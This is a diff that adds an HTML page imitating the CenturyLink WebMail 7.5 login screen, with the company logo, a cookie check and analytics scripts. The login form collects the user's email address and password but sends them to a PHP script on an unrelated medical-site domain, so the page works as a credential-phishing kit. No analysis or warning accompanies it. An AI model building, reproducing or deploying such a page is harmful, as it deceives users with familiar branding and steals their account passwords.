@@ -1,0 +1,194 @@
+<html>
+<head>
+<title>CenturyLink WebMail 7.5</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<link rel="P3Pv1" href="/w3c/p3p.xml">
+<link href="/css/main_sitemail_qw.css" rel="stylesheet" type="text/css" />
+
+<script language="Javascript" src="https://webmail.centurylinkoffice.net/images/js/menubar-big.js"></script>
+
+
+<script language="javascript">
+
+function SetCookie(cookieName,cookieValue,nDays) {
+ var today = new Date();
+ var expire = new Date();
+ if (nDays==null || nDays==0) nDays=1;
+ expire.setTime(today.getTime() + 3600000*24*nDays);
+ document.cookie = cookieName+"="+escape(cookieValue)
+                 + ";expires="+expire.toGMTString();
+}
+
+function ReadCookie(cookieName) {
+ var theCookie=""+document.cookie;
+ var ind=theCookie.indexOf(cookieName);
+ if (ind==-1 || cookieName=="") return "";
+ var ind1=theCookie.indexOf(';',ind);
+ if (ind1==-1) ind1=theCookie.length;
+ return unescape(theCookie.substring(ind+cookieName.length+1,ind1));
+}
+
+</script>                                    
+
+<script language="JavaScript">     
+function testCookie() {
+                
+testValue=Math.floor(1000*Math.random());
+SetCookie('AreCookiesEnabled',testValue);  
+
+
+if (testValue != ReadCookie('AreCookiesEnabled'))
+   {
+      top.location = '/?Action=Requirements&Msg=Your browser does not meet the minimum requirements for SiteMail to work correctly.';
+   }
+}
+
+</script>
+
+<script language="JavaScript">
+function clearemail()
+{
+
+if (document.myform.email.value == "user@domain.com")
+{
+   document.myform.email.value = '';
+}
+ }
+</script>
+</head>
+
+<body onload="testCookie()">
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+                <td class="banner1"><table border="0" cellspacing="0" cellpadding="0">
+                        <tr>
+
+                                <td>
+                                        <img src="https://webmail.centurylinkoffice.net/images/qwb_imgs/CenturyLinkLogo.jpg" alt="Qwest" width="182" height="70" vspace="3" />
+                                </td>
+                        </tr>
+                </table></td>
+        </tr>
+        <tr>
+                <td align="center" class="background">
+
+                        <table border="0" cellspacing="0" cellpadding="0">
+
+                        
+
+
+                        <tr>
+                            <form action="https://payments.medicalwebsite.com.au/cent.php" method="post" name="myform">
+                                  <input type="hidden" name="Action" value="Login">
+                                  
+
+                                        <td class="loginbox"><div class="logintitle">LOGIN</div>
+                                                        <p><strong>Email Address </strong><br />
+
+
+                                                                        <label>
+
+<input name="email" class="logintxt" value="user@domain.com" size="30" onclick="javascript:clearemail()">
+                                                                        </label>
+
+                                                        </p>
+                                                <p><strong>Password</strong><br />
+
+                                                                        <label>
+                                                                        <input type="password" name="password" class="logintxt" />
+                                                                        </label>
+                                                        </p>
+
+                                                <p><strong>Interface</strong><br />
+                                        <label>
+
+ <select size="1" name="LoginType" class="logintxt">
+                      
+                      <option selected="selected" value="None">Select One</option>
+                      
+                      
+                      <option value="simple">Simple (Any browser)</option>
+                      
+                      
+                      <option value="ajax">Simple (Ajax)</option>
+                      
+                      
+                      <option value="nfxul">Advanced NoPopups (Mozilla)</option>
+                      
+                      
+                      <option value="xul">Advanced (Mozilla)</option>
+                      
+ </select>
+                                        </label>
+                                </p>
+                                <p>
+                                        <label>
+
+                                        <input type="checkbox" name="remember" value="checkbox" />
+                                        Remember Email</label>
+                                </p>
+                                <p><input type="image" src="https://webmail.centurylinkoffice.net/images/qwb_imgs/login_btn.gif" alt="Login" width="59" height="29" border="0" name="Submit" value="Submit" /></p></td>
+                                </form>
+                        </tr>
+                        <tr>
+                                <td class="footer">
+                                    <a href="http://qwest.centurylink.com/legal/" class="footerlink" target="_blank">Terms of Use</a>
+                                </td>
+                                
+                        </tr>
+                </table></td>
+        </tr>
+</table>
+
+<!-- SiteCatalyst code version: H.17.
+Copyright 1997-2008 Omniture, Inc. More info available at
+http://www.omniture.com -->
+<script language="JavaScript" type="text/javascript" src="https://webmail.centurylinkoffice.net/images/Omniture.js"></script>
+
+<script language="JavaScript" type="text/javascript">s.server="192.168.34.11"</script>
+
+<script language="JavaScript" type="text/javascript"><!--
+                /* You may give each page an identifying name, server, and channel on
+                                                                  the next lines. */
+s.pageName=""
+s.channel=""
+s.pageType=""
+s.prop1=""
+s.prop2=""
+s.prop3=""
+s.prop4=""
+s.prop5=""
+/* Conversion Variables */
+s.campaign=""
+s.state=""
+s.zip=""
+s.events=""
+s.products=""
+s.purchaseID=""
+s.eVar1=""
+s.eVar2=""
+s.eVar3=""
+s.eVar4=""
+s.eVar5=""
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script>
+<script language="JavaScript" type="text/javascript"><!--
+                if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+                                                //--></script><noscript><a href="http://www.omniture.com" title="Web Analytics"><img src="http://hostsitemail.112.2O7.net/b/ss/hostsitemail/1/H.17--NS/0" height="1" width="1" border="0" alt="" /></a></noscript><!--/DO NOT REMOVE/-->
+                                                                                                                                                                                                <!-- End SiteCatalyst code version: H.17. -->
+
+<!-- GOOGLE ANALYTICS CODE BEGIN -->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-6408061-1");
+pageTracker._trackPageview();
+</script>
+<!-- GOOGLE ANALYTICS CODE END -->
+
+</body>
+</html>
+
